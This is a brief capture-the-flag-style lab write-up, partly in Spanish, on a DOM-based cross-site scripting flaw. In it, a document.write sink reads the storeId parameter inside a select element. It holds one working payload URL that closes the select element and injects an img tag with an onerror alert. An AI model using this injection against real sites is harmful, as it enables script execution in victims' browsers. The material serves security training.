# Lab: DOM XSS in document.write sink using source location.search inside a select element

```jsx
This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.
```

Vemos que existe un script en  Js que utiliza el parametro storeID

![image.png](Lab%20DOM%20XSS%20in%20document%20write%20sink%20using%20source%20lo%2011cfab5460ec8081a331cbd4dffb98b5/image.png)

![image.png](Lab%20DOM%20XSS%20in%20document%20write%20sink%20using%20source%20lo%2011cfab5460ec8081a331cbd4dffb98b5/image%201.png)

```jsx
https://0aa800c20475fc67da62f1fd006e0086.web-security-academy.net/product?productId=1&&storeId=%22%3E%3C/select%3E%3Cimg%20src=1%20onerror=alert(1)%3E
```

![image.png](Lab%20DOM%20XSS%20in%20document%20write%20sink%20using%20source%20lo%2011cfab5460ec8081a331cbd4dffb98b5/image%202.png)

![image.png](Lab%20DOM%20XSS%20in%20document%20write%20sink%20using%20source%20lo%2011cfab5460ec8081a331cbd4dffb98b5/image%203.png)